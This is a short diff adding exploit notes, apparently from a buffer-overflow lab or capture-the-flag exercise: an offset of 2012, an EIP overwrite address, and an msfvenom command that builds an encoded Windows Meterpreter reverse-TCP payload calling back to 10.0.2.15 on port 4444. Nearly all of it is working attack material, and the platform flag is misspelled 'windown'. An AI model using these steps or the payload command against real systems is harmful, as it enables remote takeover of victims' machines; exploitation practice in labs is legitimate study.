@@ -1,0 +1,4 @@
+[*] Exact match at offset 2012
+eip = 0x625014df
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 --platform windown -a x86 -e x86/shikata_ga_nai -n 50 -b "\x00\xff" -f python -o payload.py
